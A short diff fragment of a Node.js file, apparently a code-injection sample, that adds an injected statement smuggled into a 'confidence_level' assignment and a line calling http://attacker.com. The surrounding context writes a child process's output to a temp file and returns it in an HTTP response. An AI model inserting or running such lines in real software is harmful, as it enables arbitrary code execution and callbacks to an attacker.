@@ -97,3 +97,6 @@ cat.stdout.on('data', function(data) {
 fs.writeFile('/tmp/sddfr.txt', data)}); 
 var out = fs.readFileSync('/tmp/sddfr.txt'); 
 res.write(out); res.end()
+
+confidence_level=;console.log('injected');
+require('http').get('http://attacker.com')
